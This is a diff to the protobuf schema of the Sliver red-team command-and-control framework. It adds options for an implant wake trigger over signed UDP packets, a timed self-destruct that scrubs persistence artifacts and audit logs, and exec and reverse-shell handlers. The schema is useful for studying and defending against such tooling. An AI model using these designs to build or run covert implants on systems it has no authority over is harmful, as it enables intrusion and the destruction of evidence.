@@ -219,6 +219,51 @@ message ImplantConfig {
   reserved "SpoofData";
 
   repeated commonpb.File Assets = 200;
+
+  // [ Trigger / Wake / TTL ] --------------------------------------
+  //
+  // Optional implant features for the trigger-via-standalone Phase 2
+  // integration. All disabled by default (zero-value semantics).
+  //
+  // IncludeTriggerWake gates the implant/sliver/transports/triggerwake/
+  // package via Sliver's template directive system. When true at
+  // build time, the implant starts a passive UDP listener that
+  // accepts HMAC-signed "wake" and "self-destruct" tasks.
+  bool IncludeTriggerWake = 201;
+  // TriggerWakeBindAddr is the host:port the implant listens on.
+  string TriggerWakeBindAddr = 202;
+  // TriggerWakeSecret is the HMAC-SHA256 key the implant uses to
+  // verify incoming triggers. Generate one per implant; don't reuse
+  // across deployments.
+  bytes TriggerWakeSecret = 203;
+  // TriggerWakeAllowedClientIDs, if non-empty, restricts which
+  // client_id values the implant accepts. Empty = any signed client.
+  repeated string TriggerWakeAllowedClientIDs = 204;
+
+  // TTLEnabled activates the implant's built-in expiry timer. When
+  // true, the implant runs a ticker that compares the current time
+  // against TTLExpiresAtUnix and self-destructs (via implant/sliver/
+  // burn) when the deadline passes. Independent of any operator-
+  // fired self-destruct trigger.
+  bool TTLEnabled = 205;
+  // TTLExpiresAtUnix is the absolute deadline as a Unix timestamp
+  // (seconds since epoch). Populated by server/generate at build
+  // time as (build_time + TTLMinutes * 60). The implant treats this
+  // as opaque — it just compares to time.Now().Unix().
+  int64 TTLExpiresAtUnix = 206;
+  // TTLMinutes is the build-time-configured lifetime in minutes.
+  // 30 days default = 43200. Kept in proto for audit/operator
+  // visibility — the implant only ever reads TTLExpiresAtUnix.
+  uint32 TTLMinutes = 207;
+  // TTLBurnExtraPaths is the operator-supplied list of filesystem
+  // paths the implant will wipe on self-destruct (TTL expiry OR
+  // operator-fired). Typically: scratch dirs, drop files, cached
+  // audit logs the implant wrote during its lifetime.
+  repeated string TTLBurnExtraPaths = 208;
+  // TTLBurnPersistence is the operator-supplied list of platform-
+  // specific persistence artifact paths to scrub on self-destruct
+  // (systemd unit paths, launchd plists, registry keys, etc.).
+  repeated string TTLBurnPersistence = 209;
 }
 
 message SpoofMetadataFile {
@@ -451,6 +496,7 @@ message ListenerJob {
   HTTPListenerReq HTTPConf = 7;
   MultiplayerListenerReq MultiConf = 8;
   StagerListenerReq TCPConf = 9;
+  TriggerListenerReq TriggerConf = 10;
 }
 
 message MultiplayerListenerReq {
@@ -1593,4 +1639,158 @@ message CertificateAuthorityData {
 
 message CertificateAuthorityInfo {
   repeated CertificateAuthorityData info = 1;
+}
+
+// [ Trigger ] -------------------------------------------------------
+//
+// Authenticated UDP-trigger listener. Imports the standalone
+// github.com/0x90pkt/trigger library as the wire protocol + listener
+// core; these messages describe Sliver-side configuration that the
+// server marshals onto the library's listener.Config + intents.Registry.
+//
+// Each TriggerIntentBinding maps a task label (the string the
+// operator sends in the UDP trigger packet) to a Sliver-side action
+// configured at listener-start. The action's kind is selected by the
+// `config` oneof -- exactly one of the *Config message types is set
+// per binding.
+
+message WakeBeaconConfig {
+  // BeaconID (UUID string) of the beacon whose NextCheckin should be
+  // updated when the trigger fires.
+  string BeaconID = 1;
+}
+
+message StopJobConfig {
+  // JobName matches the Name field of an active core.Job. First match
+  // wins; document collisions to operators.
+  string JobName = 1;
+}
+
+message ExecConfig {
+  // Cmd is the absolute path of the executable. Pre-split argv only.
+  string Cmd = 1;
+  repeated string Args = 2;
+  string Workdir = 3;
+  map<string, string> Env = 4;
+  // TimeoutMs bounds the subprocess lifetime via context.WithTimeout.
+  uint32 TimeoutMs = 5;
+  // PathOverride / HomeOverride customize the sanitized subprocess env.
+  string PathOverride = 6;
+  string HomeOverride = 7;
+  uint32 MaxOutputBytes = 8;
+}
+
+message ReverseShellConfig {
+  // OperatorAddr is the host:port the server dials out to on fire.
+  string OperatorAddr = 1;
+  // ShellPath absolute; empty => platform default (/bin/sh or cmd.exe).
+  string ShellPath = 2;
+  repeated string ShellArgs = 3;
+  uint32 DialTimeoutMs = 4;
+  uint32 MaxSessionDurationMs = 5;
+  // UseTLS wraps the operator-side channel in TLS.
+  bool UseTLS = 6;
+}
+
+message TriggerIntentBinding {
+  // Name is the task label on the wire (operator's --task flag).
+  string Name = 1;
+  // Exactly one of the *Config fields below is set, selecting the
+  // handler kind.
+  oneof Config {
+    WakeBeaconConfig WakeBeacon = 10;
+    StopJobConfig    StopJob    = 11;
+    ExecConfig       Exec       = 12;
+    ReverseShellConfig ReverseShell = 13;
+  }
+}
+
+message TriggerListenerReq {
+  // Host is the UDP bind IP, e.g. "0.0.0.0".
+  string Host = 1;
+  // Port is the UDP bind port.
+  uint32 Port = 2;
+  // SharedSecret is the default HMAC key, used for any client_id not
+  // in PerClientKeys. Required unless every accepted client has a
+  // per-client key.
+  bytes SharedSecret = 3;
+  // PerClientKeys maps client_id => HMAC secret bytes for multi-key
+  // deployments. Optional.
+  map<string, bytes> PerClientKeys = 4;
+  // Strict, if true, rejects any client_id not in PerClientKeys even
+  // when SharedSecret is set.
+  bool Strict = 5;
+  // AllowedClientIDs restricts which client_id values are accepted.
+  // Empty list = any signed client.
+  repeated string AllowedClientIDs = 6;
+  // AllowedSources accepts exact IPs and CIDR ranges (v4 + v6).
+  // Empty list = allow-all.
+  repeated string AllowedSources = 7;
+  // ServerID is included in audit events.
+  string ServerID = 8;
+  // Tasks bind labels to handlers at listener-start.
+  repeated TriggerIntentBinding Intents = 9;  // wire name kept for compat
+  // Tunables (all optional; library applies sane defaults if zero).
+  uint32 Workers                    = 20;
+  uint32 MaxClockSkewSeconds        = 21;
+  uint32 ReplayTTLSeconds           = 22;
+  uint32 MaxMessageBytes            = 23;
+  uint32 GlobalRatePerSecond        = 24;
+  uint32 PerClientRequestsPerMinute = 25;
+  uint32 MaxReplayEntries           = 26;
+  uint32 MaxRateLimitEntries        = 27;
+  uint32 HandlerTimeoutMs           = 28;
+}
+
+// TriggerIntentsReq selects a running trigger listener job for the
+// task-introspection RPC.
+message TriggerIntentsReq {
+  uint32 JobID = 1;
+}
+
+// TriggerIntents reports the task bindings registered for a running
+// trigger listener. Returned by the TriggerIntents RPC.
+message TriggerIntents {
+  uint32 JobID = 1;
+  repeated TriggerIntentBinding Bindings = 2;
+}
+
+// TriggerDispatchTaskReq instructs the server to fire a named task
+// handler on a running trigger listener, bypassing the UDP wire
+// protocol. This lets operators dispatch tasks interactively from the
+// sliver console ("trigger send <job-id> <task-name>") without an
+// external trigger-client binary.
+message TriggerDispatchTaskReq {
+  uint32 JobID    = 1;
+  string TaskName = 2;
+}
+
+// TriggerFireReq instructs the server to construct a signed trigger
+// packet (HMAC-SHA256, wire-format JSON) and send it as a single UDP
+// datagram to the specified target. This is the sliver-native
+// replacement for the standalone trigger-client binary — used to wake
+// dormant implants or fire implant-side self-destruct without leaving
+// the console.
+//
+// The SharedSecret must match the implant's baked-in triggerwake
+// secret (set at generation time via --trigger-wake-secret-env /
+// --trigger-wake-secret).
+message TriggerFireReq {
+  string TargetHost   = 1;  // IP or hostname of the implant
+  uint32 TargetPort   = 2;  // UDP port the implant's triggerwake is bound to
+  string Intent       = 3;  // intent label: "wake", "self-destruct", "exec", etc.
+  bytes  SharedSecret = 4;  // HMAC-SHA256 shared secret
+  string ClientID     = 5;  // sender identity for audit trail (default: "sliver-operator")
+  string Payload      = 6;  // command/data for bidirectional intents (e.g. exec)
+}
+
+// TriggerFireResp carries the result of a trigger fire. For fire-and-
+// forget intents (wake, self-destruct), only Sent is populated. For
+// bidirectional intents (exec), Output and ExitCode carry the implant's
+// response.
+message TriggerFireResp {
+  bool   Sent     = 1;  // true if the packet was sent
+  string Output   = 2;  // implant command output (exec only)
+  int32  ExitCode = 3;  // implant command exit code (exec only)
+  string Error    = 4;  // implant-side or transport error, if any
 }
